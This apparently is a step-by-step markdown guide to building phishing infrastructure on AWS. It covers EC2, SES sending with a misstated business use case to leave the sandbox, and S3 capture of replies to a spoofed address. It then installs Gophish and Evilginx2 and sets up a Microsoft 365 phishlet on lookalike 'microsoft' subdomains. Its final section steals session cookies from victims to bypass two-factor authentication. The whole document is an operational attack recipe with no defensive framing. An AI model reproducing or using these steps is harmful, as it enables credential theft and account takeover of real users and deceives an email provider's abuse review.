### Creating your EC2 Instance

1. Search Bar EC2
2. Launch Instance
3. Ubuntu Server XX.XX -> Select
4. t2 micro -> Review and Launch
5. Launch
6. Create new key pair
7. Name (phishing.pem) -> Save
8. Lauch Instance
9. View Instances

### Configuring AWS Security Groups

1. Security Groups
2. Create security group
3. Name (Phishing)
4. Inbound rules -> Add rule

| Type | Port Range | Source | Description |
| ---- | ---------- | ------ | ----------- |
| Custom TCP | 22 | Anywhere iPv4 | SSH |
| Custom UDP | 53 | Anywhere iPv4 | DNS |
| Custom TCP | 80 | Anywhere iPv4 | HTTP |
| Custom TCP | 443 | Anywhere iPv4 | HTTPS |
| Custom TCP | 3333 | Anywhere iPv4 | Gophish admin |

5. Create security group
6. Instances -> Security group -> Click -> Security -> Change security group
7. Remove -> Add (Phishing) -> Add security group
8. Save

### Connecting To EC2 Instance

Web

1. Right Click -> Connect -> Connect

Linux

1. ssh -i phishing.pem ubuntu@(ip)

Windows

1. download putty
2. PuTTY Key Generator -> Load -> phishing.pem -> Open -> Ok -> Save private key -> Save
3. PuTTY -> (ip) -> SSH Tab -> Auth Tab -> Browse -> phishing.ppk -> Open -> Session -> Open

### Setting up Amazon Simple Email Services

1. Search Bar SES
2. Domains
3. Verify a New Domain
4. enter (phish1ng.com)
5. ✓ Generate DKIM Settings
6. Verify This Domain
7. Use Route 53
8. Create Record Sets

### Moving Out of the SES Sandbox

1. Search Bar SES
2. Email Sending -> Sending Statistics
3. Edit your account details
4. Enable production access: Yes
5. Website URL: (phish1ng.com)
6. Use case description: Creating for bussiness purposes
7. Submit for review *2 Days

[HELP?: Moving out of the Amazon SES sandbox](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/request-production-access.html)

### Creating S3 Bucket to Capture Email Responses

1. Search Bar S3
2. Email Receiving -> Rule Sets
3. Create a Rule set
4. Rule set name: (phishingrules) -> Create a Rule set
5. Click (phishingrules) -> Create Rule
6. (email to be spoofed) -> Add Recipient -> Next Step
7. Add Action: S3
8. S3 Bucket: Create S3 bucket
9. (unique bucket name) -> Create Bucket -> Next Step
10. Rule Name: (phishingrule) -> Next Step
11. Create Rule
12. Email Receiving -> Rule Sets
13. Select (phishingrules) Set as Actice Rule set
14. Search Bar Route53
15. Create record
16. Record type: MX - Specific mail servers 
17. Value: 10 inbound-smtp.us-west2.amazonaws.com -> Create records

[HELP?: How can I use Amazon SES to receive inbound emails, and then store those emails on Amazon S3?](https://aws.amazon.com/premiumsupport/knowledge-center/ses-receive-inbound-emails/)

### Creating SMTP Settings

1. Search Bar SES
2. SMTP Settings -> Create My SMTP Credentials
3. Create
4. Download Credentials

### Installing Gophish

install
```
sudo apt update -y && sudo apt upgrade -y
sudo apt install golang
go get github.com/gophish/gophish
cd go/src/github.com/gophish/gophish/
go build
```

config to listen to all
```
vim config.json

"listen_url": "0.0.0.0:3333" 
```

run
```
sudo ./gophish
```

### Installing Evilginx2

install
```
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
```

run
```
sudo ./bin/evilginx -p ./phishlets/
```

### Configuring Evilginx2 for Phishing

config domain and ip
```
: config domain (phish1ng.com)
: config ip (ip)
```

route53
1. Search Bar route53
2. Create record
3. Record name: microsoft
4. Record type: A - Routes traffic to an iPv4 address and so...
5. Value: (ip)
6. Create records *24 hours

Create more 
- Record name: account.microsoft
- Record name: login.microsoft
- Record name: www.microsoft
- Record name: outlook.microsoft

config phishlet
```
: phishlets hostname o365 (microsoft.phish1ng.com)
: phishlets enable o365
```

create lure
```
: lures create o365
: lures get-url 0
```

bypass 2-factor
```
: sessions                  #show all sessions
: sessions 4                #show all details about session 4
#copy json paste to cookie editor
```
